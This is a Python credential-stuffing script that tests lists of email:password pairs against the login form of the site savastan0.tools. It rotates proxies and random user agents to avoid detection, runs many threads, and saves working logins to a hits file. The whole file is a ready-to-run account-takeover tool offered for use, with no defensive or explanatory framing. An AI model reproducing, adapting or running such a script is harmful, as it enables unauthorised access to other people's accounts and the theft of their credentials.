import os
import random
import requests
import time
import warnings
import threading
import shutil
from queue import Queue
from colorama import init, Fore, Style
from user_agent import generate_user_agent
from urllib.parse import urlparse

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Code By - @LEGEND_BL
UA_CONFIGS = [
    {'os': 'win', 'navigator': 'chrome'},
    {'os': 'win', 'navigator': 'firefox'},
    {'os': 'win', 'navigator': 'ie'},
    {'os': 'mac', 'navigator': 'chrome'},
    {'os': 'mac', 'navigator': 'firefox'},
    {'os': 'linux', 'navigator': 'chrome'},
    {'os': 'linux', 'navigator': 'firefox'},
    {'os': 'android', 'navigator': 'chrome'},
]

def get_random_user_agent():
    try:
        config = random.choice(UA_CONFIGS)
        return generate_user_agent(os=config['os'], navigator=config['navigator'])
    except:
        return generate_user_agent()

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'SAVASTAN0.TOOLS CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")

combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"

def load_combos(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def load_proxies(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
            return proxies if proxies else []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    
    if "://" in p:
        protocol = p.split("://")[0].lower()
        rest = p.split("://", 1)[1]
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            return None
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
            else:
                proxy_url = f"{protocol}://{rest}"
        else:
            proxy_url = f"{protocol}://{rest}"
        return {"http": proxy_url, "https": proxy_url}
    
    elif "@" in p:
        auth_part, host_part = p.rsplit("@", 1)
        if ":" in auth_part:
            username, password = auth_part.split(":", 1)
            proxy_url = f"http://{username}:{password}@{host_part}"
            return {"http": proxy_url, "https": proxy_url}
    
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

combos = load_combos(combo_file)
proxies = load_proxies(proxy_file)

if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()

use_proxies = True
if not proxies:
    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
    if mode_input == 'y':
        use_proxies = False
        print(f"{Fore.YELLOW}[*] Proxy-less mode: Will check {len(combos)} accounts\n")
    else:
        input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
        exit()
else:
    if not SOCKS_AVAILABLE:
        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
        if has_socks:
            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")

if use_proxies:
    threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
    threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
else:
    threads_count = 1
    print(f"{Fore.YELLOW}[*] Using 1 thread for proxy-less mode\n")

if use_proxies:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
else:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | No proxies | Threads: {threads_count}\n")
print(f"{Fore.BLUE}[*] Starting checker...!\n")

hit_counter = fail_counter = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0

def check_account(email, pwd, proxy_dict):
    s = requests.Session()
    userA = get_random_user_agent()
    
    try:
        headers = {
            "User-Agent": userA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        
        s.get("https://savastan0.tools/login", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
        
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Origin"] = "https://savastan0.tools"
        headers["Referer"] = "https://savastan0.tools/login"
        
        r = s.post("https://savastan0.tools/login",
                   data={"username": email, "password": pwd},
                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "home"]) or any(x in txt for x in ["balance", "logout", "welcome"]):
            return "hit", "Valid"
        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except requests.exceptions.ProxyError:
        return "error", "Proxy error"
    except:
        return "error", "Request failed"

def worker(q):
    global result_counter, hit_counter, fail_counter
    while True:
        try:
            combo = q.get_nowait()
        except:
            break
        
        email, pwd = combo.split(":", 1)
        proxy_dict = None
        
        if use_proxies:
            for _ in range(3):
                proxy_str = random.choice(proxies)
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict: break
            
            if not proxy_dict:
                with counters_lock: fail_counter += 1
                with counters_lock: num = result_counter + 1; result_counter = num
                with print_lock:
                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
                q.task_done()
                continue
        
        result, reason = "error", "Unknown"
        for attempt in range(3):
            result, reason = check_account(email, pwd, proxy_dict)
            if result != "error":
                break
            time.sleep(3 + attempt * 2)
        
        with counters_lock: num = result_counter + 1; result_counter = num
        
        if result == "hit":
            with counters_lock: hit_counter += 1
            with open("Savastan0_Hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Status: Valid")
        else:
            with counters_lock: fail_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
        
        q.task_done()
        time.sleep(3)

def main():
    q = Queue()
    for c in combos:
        q.put(c)
    
    open("Savastan0_Hits.txt", "w").close()
    
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
    
    q.join()
    
    print(f"\n{Fore.CYAN}Finished...!")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter}")
    print(f"{Fore.CYAN}Hits saved to Savastan0_Hits.txt")
    input(f"\nPress Enter to exit...")

if __name__ == "__main__":
    main()
